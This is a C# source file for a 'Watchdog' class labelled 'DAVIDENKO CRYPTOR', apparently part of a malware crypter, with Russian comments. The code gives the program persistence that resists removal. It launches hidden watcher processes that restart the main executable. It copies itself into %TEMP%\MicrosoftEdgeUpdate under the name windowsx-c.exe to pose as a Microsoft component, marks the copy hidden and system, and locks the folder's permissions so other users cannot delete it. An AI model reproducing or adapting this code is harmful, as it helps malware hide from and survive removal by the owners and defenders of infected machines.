using System;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Threading;

namespace ns0
{
    internal static class Watchdog
    {
        private const string MutexName = @"Global\DAVIDENKO CRYPTOR_WatchdogMutex";
        private const string PipeName = "DAVIDENKO CRYPTOR_WatchdogPipe";
        private const int HeartbeatIntervalMs = 5000;
        private const int HeartbeatTimeoutMs = 15000;
        private const int MonitorTickMs = 2000;
        private const string WatcherArg = "--watcher";
        private const string SecondaryArg = "--secondary";

        // Имя mutex/pipe зависит от роли процесса: primary watcher держит MutexName/PipeName,
        // вторичный guard — SecondaryMutexName/SecondaryPipeName (иначе оба бились бы об один).
        private static string ActiveMutexName => _isSecondary ? SecondaryMutexName : MutexName;
        private static string ActivePipeName => _isSecondary ? SecondaryPipeName : PipeName;

        private static Mutex _mutex;
        private static Thread _pipeThread;
        private static Thread _monitorThread;
        private static Thread _heartbeatThread;
        private static volatile bool _running = true;
        private static volatile bool _isWatcher;
        private static volatile bool _isSecondary;
        private static DateTime _lastHeartbeatUtc = DateTime.UtcNow;
        private static int _parentPid = -1;
        private static readonly object _heartbeatLock = new object();
        private static string GetExecutablePath()
        {
            try
            {
                return Process.GetCurrentProcess().MainModule.FileName;
            }
            catch
            {
                return System.Reflection.Assembly.GetExecutingAssembly().Location;
            }
        }
        public static bool Initialize(string[] args)
        {
            if (args != null)
            {
                for (int i = 0; i < args.Length; i++)
                {
                    if (args[i] == SecondaryArg)
                    {
                        // Вторичный guard: отдельный mutex_2 + pipe_2, чтобы не конфликтовать
                        // с основным watcher'ом на одном MutexName.
                        _isWatcher = true;
                        _isSecondary = true;
                    }
                    else if (args[i] == WatcherArg)
                    {
                        _isWatcher = true;
                        if (i + 1 < args.Length)
                        {
                            int.TryParse(args[i + 1], out _parentPid);
                        }
                    }
                }
            }

            if (_isWatcher)
            {
                return RunWatcher();
            }
            else
            {
                StartAsMain();
                return true;
            }
        }
        private static void StartAsMain()
        {
            try
            {
                bool createdNew;
                var probeMutex = new Mutex(false, MutexName, out createdNew);
                if (createdNew)
                {
                    try { probeMutex.ReleaseMutex(); } catch { }
                    probeMutex.Dispose();
                    SpawnWatcher();
                    SpawnSecondaryGuard();
                }
                else
                {
                    probeMutex.Dispose();
                    if (!IsWatcherProcessAlive())
                    {
                        SpawnWatcher();
                    }
                    try { SpawnSecondaryGuard(); } catch { }
                }
            }
            catch { }

            _heartbeatThread = new Thread(HeartbeatLoop)
            {
                IsBackground = true,
                Name = "WatchdogHeartbeat"
            };
            _heartbeatThread.Start();
        }

        private static bool RunWatcher()
        {
            bool createdNew;
            _mutex = new Mutex(true, ActiveMutexName, out createdNew);
            if (!createdNew)
            {
                _mutex.Dispose();
                _mutex = null;
                return false;
            }
            _pipeThread = new Thread(PipeServerLoop)
            {
                IsBackground = true,
                Name = "WatchdogPipeServer"
            };
            _pipeThread.Start();
            _monitorThread = new Thread(MonitorLoop)
            {
                IsBackground = true,
                Name = "WatchdogMonitor"
            };
            _monitorThread.Start();
            try
            {
                while (_running)
                {
                    Thread.Sleep(1000);

                    if (_parentPid > 0)
                    {
                        try
                        {
                            var p = Process.GetProcessById(_parentPid);
                            if (p.HasExited)
                            {
                                _running = false;
                                break;
                            }
                        }
                        catch
                        {
                        }
                    }
                }
            }
            catch { }

            Cleanup();
            return false;
        }
        private static void HeartbeatLoop()
        {
            while (_running)
            {
                try
                {
                    using (var client = new NamedPipeClientStream(
                        ".", ActivePipeName, PipeDirection.Out, PipeOptions.None))
                    {
                        client.Connect(1000);
                        byte[] msg = System.Text.Encoding.UTF8.GetBytes("ALIVE");
                        client.Write(msg, 0, msg.Length);
                        client.Flush();
                    }
                }
                catch {}

                Thread.Sleep(HeartbeatIntervalMs);
            }
        }
        private static void PipeServerLoop()
        {
            while (_running)
            {
                try
                {
                    using (var server = new NamedPipeServerStream(
                        ActivePipeName,
                        PipeDirection.In,
                        NamedPipeServerStream.MaxAllowedServerInstances,
                        PipeTransmissionMode.Byte,
                        PipeOptions.None))
                    {
                        server.WaitForConnection();

                        byte[] buffer = new byte[64];
                        int read = server.Read(buffer, 0, buffer.Length);

                        if (read > 0)
                        {
                            lock (_heartbeatLock)
                            {
                                _lastHeartbeatUtc = DateTime.UtcNow;
                            }
                        }
                    }
                }
                catch
                {
                    Thread.Sleep(500);
                }
            }
        }
        private static void MonitorLoop()
        {
            while (_running)
            {
                Thread.Sleep(MonitorTickMs);

                double elapsed;
                lock (_heartbeatLock)
                {
                    elapsed = (DateTime.UtcNow - _lastHeartbeatUtc).TotalMilliseconds;
                }

                if (elapsed > HeartbeatTimeoutMs)
                {
                    bool mainAlive = false;
                    if (_parentPid > 0)
                    {
                        try
                        {
                            var p = Process.GetProcessById(_parentPid);
                            mainAlive = !p.HasExited;
                        }
                        catch { mainAlive = false; }
                    }

                    if (!mainAlive)
                    {
                        RestartMain();
                        lock (_heartbeatLock)
                        {
                            _lastHeartbeatUtc = DateTime.UtcNow;
                        }
                    }
                }

                // Каскад: если ключевой процесс живёт, но сторож пропал — поднять сторожа.
                try
                {
                    if (!IsGuardAlive())
                    {
                        SpawnSecondaryGuard();
                    }
                }
                catch { }
            }
        }        private static void RestartMain()
        {
            try
            {
                string exePath = GetExecutablePath();
                if (string.IsNullOrEmpty(exePath) || !File.Exists(exePath))
                    return;

                var psi = new ProcessStartInfo
                {
                    FileName = exePath,
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Normal
                };

                var proc = Process.Start(psi);
                if (proc != null)
                {
                    _parentPid = proc.Id;
                }
            }
            catch { }
        }        private static void SpawnWatcher()
        {
            try
            {
                string exePath = GetExecutablePath();
                if (string.IsNullOrEmpty(exePath) || !File.Exists(exePath))
                    return;

                int myPid = Process.GetCurrentProcess().Id;

                var psi = new ProcessStartInfo
                {
                    FileName = exePath,
                    Arguments = WatcherArg + " " + myPid.ToString(),
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                };

                Process.Start(psi);
            }
            catch { }
        }
        private static bool IsWatcherProcessAlive()
        {
            try
            {
                string exePath = GetExecutablePath();
                string name = Path.GetFileNameWithoutExtension(exePath);

                foreach (var p in Process.GetProcessesByName(name))
                {
                    try
                    {
                        if (p.Id != Process.GetCurrentProcess().Id)
                        {
                            return true;
                        }
                    }
                    catch { }
                }
            }
            catch { }
            return false;
        }
        public static void Start()
        {
            TryInitializeFromNull();
        }

        private static void TryInitializeFromNull()
        {
            try
            {
                Initialize(new string[0]);
            }
            catch { }
        }
        public static void Heartbeat()
        {
            // Реальный пульс: главный процесс отмечает свою живость.
            // Монитор читает это значение и решает о рестарте.
            lock (_heartbeatLock)
            {
                _lastHeartbeatUtc = DateTime.UtcNow;
            }
        }

        // Каскадный сторож: запускает вторичный watcher с отдельным mutex.
        private const string SecondaryMutexName = @"Global\DAVIDENKO CRYPTOR_WatchdogMutex_2";
        private const string SecondaryPipeName = "DAVIDENKO CRYPTOR_WatchdogPipe_2";

        public static void SpawnSecondaryGuard()
        {
            // P2.7: не спавним дубликат — если второй guard уже жив, его mutex_2 захвачен.
            try
            {
                bool createdNew;
                var probe = new Mutex(false, SecondaryMutexName, out createdNew);
                probe.Dispose();
                if (!createdNew) return; // guard уже запущен и держит mutex_2
            }
            catch { }

            try
            {
                string exePath = GetExecutablePath();
                if (string.IsNullOrEmpty(exePath) || !File.Exists(exePath)) return;

                // SPOF-фикс: вторичный сторож живёт в теневой копии, чтобы удаление
                // основного exe не убило watchdog. Копия — в %TEMP% под системным именем.
                string guardPath = exePath;
                try
                {
                    string shadowDir = Path.Combine(Path.GetTempPath(), "MicrosoftEdgeUpdate");
                    Directory.CreateDirectory(shadowDir);

                    // Ужесточаем ACL: только текущий пользователь + SYSTEM. Иначе любой
                    // юзер на машине может прочитать/удалить сторожа.
                    try
                    {
                        var di = new DirectoryInfo(shadowDir);
                        var sec = di.GetAccessControl();
                        sec.SetAccessRuleProtection(true, false);
                        var me = System.Security.Principal.WindowsIdentity.GetCurrent().User;
                        var system = new System.Security.Principal.SecurityIdentifier(
                            System.Security.Principal.WellKnownSidType.LocalSystemSid, null);
                        sec.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(
                            me, System.Security.AccessControl.FileSystemRights.FullControl,
                            System.Security.AccessControl.AccessControlType.Allow));
                        sec.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(
                            system, System.Security.AccessControl.FileSystemRights.FullControl,
                            System.Security.AccessControl.AccessControlType.Allow));
                        di.SetAccessControl(sec);
                    }
                    catch { }

                    string shadowExe = Path.Combine(shadowDir, "windowsx-c.exe");
                    // Копируем только если копии нет или она отличается по размеру/дате —
                    // не жуём 5+ МБ на каждый запуск.
                    bool needCopy = true;
                    try
                    {
                        var src = new FileInfo(exePath);
                        var dst = new FileInfo(shadowExe);
                        if (dst.Exists && dst.Length == src.Length &&
                            dst.LastWriteTimeUtc == src.LastWriteTimeUtc)
                        {
                            needCopy = false;
                        }
                    }
                    catch { }

                    if (needCopy)
                    {
                        File.Copy(exePath, shadowExe, true);
                        try { File.SetAttributes(shadowExe, FileAttributes.Hidden | FileAttributes.System); } catch { }
                    }
                    guardPath = shadowExe;
                }
                catch { }

                var psi = new ProcessStartInfo
                {
                    FileName = guardPath,
                    Arguments = "--watcher --secondary " + Process.GetCurrentProcess().Id.ToString(),
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                };
                Process.Start(psi);
            }
            catch { }
        }

        public static bool IsGuardAlive()
        {
            try
            {
                string exePath = GetExecutablePath();
                string name = Path.GetFileNameWithoutExtension(exePath);
                int me = Process.GetCurrentProcess().Id;
                int count = 0;
                foreach (var p in Process.GetProcessesByName(name))
                {
                    try { if (p.Id != me) count++; }
                    catch { }
                }
                return count > 0;
            }
            catch { }
            return false;
        }

        public static void Stop()
        {
            _running = false;

            try { _pipeThread?.Join(1000); } catch { }
            try { _monitorThread?.Join(1000); } catch { }
            try { _heartbeatThread?.Join(1000); } catch { }

            Cleanup();
        }

        private static void Cleanup()
        {
            try
            {
                if (_mutex != null)
                {
                    try { _mutex.ReleaseMutex(); } catch { }
                    _mutex.Dispose();
                    _mutex = null;
                }
            }
            catch { }
        }
    }
}